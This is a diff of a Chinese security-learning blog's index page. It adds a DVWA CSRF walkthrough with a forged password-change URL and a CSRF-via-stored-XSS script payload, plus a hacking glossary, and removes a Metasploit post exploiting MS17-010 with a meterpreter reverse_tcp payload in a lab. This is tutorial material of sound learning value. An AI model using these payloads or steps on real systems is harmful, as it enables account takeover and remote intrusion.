@@ -152,6 +152,68 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2021/06/04/%E6%B5%85%E8%B0%88csrf/">
+                CSRF
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2021-06-04</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>一、定义：CSRF（cross-site request forgery）：跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。<br>二、攻击特点：攻击者盗用用户的身份，以用户的名义进行某些非法操作</p>
+<h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p>一、low：<img src="https://img-blog.csdnimg.cn/20210518204716888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>首先按照流程修改密码，发现url改变<a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</a><br>查看源码，没有任何防护，可直接通过修改URL修改密码<br>二、medium(需要使用到hackbar)<br>查看源码，可知先检测refer是否包含主机名称，再进行更改密码 </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,$_SERVER[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">            $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) or die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            echo <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            echo <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line">        echo <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210522090407759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210522090425425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>一、构造链接：<a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</a><br>二、利用短链接来隐藏URL（点击短链接，会自动跳转到真实网站）<br>因为本地搭的环境，服务器域名是ip所以无法生成相应的短链接= =，实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的。<br>三、构造攻击页面<br>四、CSRF与XSS结合<br>将CSRF代码写入XSS注入点（最好是存储型）<br>&lt; script<br>src= “<a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#&quot;&gt;">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#&quot;&gt;</a>&lt;/ script&gt;<br>用户触发XSS，优点是更加具有隐蔽性，不会出现密码修改界面 </p>
+<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>$_SERVER[   ‘HTTP_REFERER’   ]此函数用来判断用户提供的信息是否与127.0.0.1一致</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2021/05/19/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2%E5%91%BD%E4%BB%A4%E7%89%88/">
+                网络安全常见名词
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2021-05-19</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>黑客攻防命令版</p>
+<p>一、肉鸡：<br>肉鸡比喻那些可以随意被黑客控制的计算机，黑客可以像操作自己的计算机那样来操作它们，而不被对方所发觉。<br>二、木马：<br>本马指表面上伪装成正常的程序，但是当这些程序运行时，入侵者就会获取系统的整个控制权限。有很多黑客热衷于使用木马程序来控制别人的计算机，比如灰鸽子、黑洞、PcShare等。<br>三、网页木马：<br>网页本马指表面上伪装成普通的网页文件或是将恶意的代码直接插入到正常的网页文件中，当有人访问时，网页木马就会利用对方系统或者浏览器的漏洞自动将配置好木马的服务端下载到访问者的计算机上来自动执行。<br>四、后门：<br>后门是一种形象的比喻，黑客在利用某些方法成功地控制了目标主机后，可以在对方的系统中植入特定的程序，或者是修改某些设置。这些改动从表面上很难被察觉，但是黑客却可以使用相应的程序或者方法轻易地与这台计算机建立连接，重新控制这台计算机，这就好像黑客偷偷地配了一把主人房间的钥匙，可以随时进出房间而不被主人发现一样。<br>**五、IPC$ ∗ ∗ ： I P C **： IPC∗∗：IPC是共享“命名管道”的资源，它是为了让进程之间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用<br>六、弱口令（weak auth）：<br>弱口令指那些强度不够，容易被猜解的口令，类似123、abc这样的口令（密码）。<br>七、shell:<br>Shell指的是一种命令执行环境，比如，我们按下键盘上的“开始键+R”组合键时会出现“运行”对话框，在里面输入“cmd”会出现一个用于执行命令的黑窗口，这个就是Windows的Shell执行环境。<br>八、WebShell<br>WebShell就是以ASP、PHP、JSP或者CGI等网页文件形式存在的一种命令执行环境，也可以将其称为一种网页后门。<br>九、溢出<br>确切地讲，应该是“缓冲区溢出”。简单地解释就是程序对接收的输入数据没有执行有效的检测而导致错误，后果可能是程序崩溃或者是执行攻击者的命令。其大致可以分为两类：①堆溢出；②栈溢出。<br>十、内网<br>内网通俗地讲就是局域网，比如网吧、校园网、公司内部网等。IP地址如果是在以下三个范围之内，就说明我们是处于内网之中的：10.0.0.0～10.255.255.255、172.16.0.0～172.31.255.255、192.168.0.0~192.168.255.255<br>十一、加壳<br>利用特殊的算法，改变EXE可执行程序或者DLL动态链接库文件的编码（比如实现压缩、加密），以达到缩小文件体积或者加密程序编码，甚至是躲过杀毒软件查杀的目的。目前较常用的壳有UPX、ASPack、PePack、PECompact、UPack等。<br>十二、花指令<br>花指令是几句汇编指令，可让汇编语句进行一些跳转，使得杀毒软件不能正常地判断病毒文件的构造。通俗地讲，就是杀毒软件是从头到脚按顺序来查找病毒的，如果我们把病毒的头和脚颠倒位置，杀毒软件就找不到病毒了。<br>未完待续…</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2021/05/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E9%A2%98/">
                 攻防世界web新书题解析
             </a>
@@ -445,68 +507,6 @@
 
 </div>
             
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2021/05/18/%E6%B5%85%E8%B0%88msf/">
-                Metasploit渗透测试框架的基本使用
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2021-05-18</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p> @<a href="Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8">TOC</a></p>
-<h2 id="Metasploit渗透测试框架介绍"><a href="#Metasploit渗透测试框架介绍" class="headerlink" title="Metasploit渗透测试框架介绍"></a>Metasploit渗透测试框架介绍</h2><p><img src="https://img-blog.csdnimg.cn/20210410103503577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="1、简介：Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称MSF。是一个免费、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。
-2、Metasploit体系框架"><br>&lt;1&gt;基础库：Metasploit基础库文件位于源码目录路径下的libraries目录中，包括Rex，framework和framework-base三部分。<br> Rex是整个框架所依赖的最基础的一些组件，如包装的网络套接字、网络应用协议客户端与服务端实现、日志子系统、渗透攻击支持例程、postgreSQL以及MYSQL数据库支持等；<br> &lt;2&gt;模块：模块组织按照不同的用途分为6种类型的模块<br> 分为辅助模块（Aux）、渗透攻击模块（Exploits）、后渗透攻击模块（Post）、攻击载荷模块（payloads）、编码器模块（Encoders）、空指令模块（Nops）。<br> 注：payload又称攻击载荷，主要是用来建立目标机与攻击机稳定连接的，可返回shell，也可以进行程序注入等。<strong>可以理解为后门</strong><br> &lt;3&gt;插件：插件能够扩充框架的功能，或者组装已有功能构成高级特性的组件。插件可以集成现有的一些外部安全工具，如Nessus、OpenVAS漏洞扫描器等<br> &lt;4&gt;接口:包括msfconsole控制终端、msfcli命令行、msfgui图形化界面、armitage图形化界面以及msfapi远程调用接口。e<br> &lt;5&gt;功能程序: metasploit还提供了一系列可直接运行的功能程序，支持渗透测试者与安全人员快速地利用metasploit框架内部能力完成一些特定任务。比如msfpayload、msfencode和msfvenom可以将攻击载荷封装为可执行文件、C语言、JavaScript语言等多种形式，并可以进行各种类型的编码。</p>
-<h2 id="Metasploit目录"><a href="#Metasploit目录" class="headerlink" title="Metasploit目录"></a>Metasploit目录</h2><p><img src="https://img-blog.csdnimg.cn/2021041011024921.png" alt="在这里插入图片描述">data是Metasploit使用的可编辑文件<br>modules是模块<br>lib是框架<br>plugins是插件<br>scripts是Metasploit和其他脚本</p>
-<h2 id="实战训练"><a href="#实战训练" class="headerlink" title="实战训练"></a>实战训练</h2><p>攻击机：kali2020<br>被攻击机：windows7（445端口开启、windowsdefener关闭）<br>第一步：打开msf<br><img src="https://img-blog.csdnimg.cn/2021042416135198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第二步：永恒之蓝漏洞编号为ms17-010</p>
-<p><img src="https://img-blog.csdnimg.cn/20210424161947609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第三步：利用辅助模块扫描目标<br>use 1<br><img src="https://img-blog.csdnimg.cn/2021042416223116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看所需设置：options<br>yes为必须设置<br>设置目标地址：set rhosts +IP地址<br>设置目标端口：set rpost +445<br>攻击：run<br>第四步：</p>
-<p><img src="https://img-blog.csdnimg.cn/20210424163908565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看所需设置options<br>设置目标地址：set RHOSTS windows7ip<br>设置目标端口：set RPORT 445<br>设置payload：set payload windows/x64/meterpreter/reverse_tcp<br>设置本地地址：set LHOST 本地IP<br>攻击：run</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2021/05/18/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B/">
-                TCP握手
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2021-05-18</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><strong>建立TCP连接需要发送三个包才能建立，而断开连接则需要发送四个包，所以被称为TCP三次握手四次挥手。</strong></p>
-<h2 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h2><p>第一次握手：建立连接时，客户端发送syn包（syn=x）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号。<br>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=x+1），同时自己也发送一个SYN包（syn=y），即SYN+ACK包，此时服务器进入SYN_RECV状态；<br>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=y+1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手。<br><img src="https://img-blog.csdnimg.cn/20210427171052929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h2><p>客户端→服务端：发送FIN报文，表示没有要发送的数据，并询问服务端有无没有发送的数据。如果还有没发送完的数据可不必关闭socket，继续发送。<br>服务端→客户端：发送ACK表示还未确定是否有未发送完的数据，Client端进入FIN_WAIT状态。<br>服务端→客户端：Server端确认数据发送完成后发送FIN报文，表示Client端可以关闭连接了。<br>客户端→服务端：发送ACK后进入TIME_WAIT状态，Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭。<br><strong>注意：为什么建立连接需要三次握手而解除需要四次挥手呢？<br>因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，”你发的FIN报文我收到了”。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步挥手。</strong><br><img src="https://img-blog.csdnimg.cn/20210427171316659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>与UDP不同的是，TCP通过三次握手四次挥手避免了掉包情况的发生</p>
-
-        </div>
-    
-
-</div>
-            
         </section>
     </div>
 </div>
@@ -549,19 +549,19 @@
         <ul>
             
             <li>
+                <a class="footer-post" href="/2021/07/18/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/">图片隐写</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2021/07/18/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC/">图片木马的制作</a>
+            </li>
+            
+            <li>
                 <a class="footer-post" href="/2021/06/20/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/">暴力破解</a>
             </li>
             
             <li>
                 <a class="footer-post" href="/2021/06/19/buuctf/">buuctf</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2021/06/19/SSRF/">SSRF</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2021/06/19/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/">反序列化字符逃逸</a>
             </li>
             
         </ul>
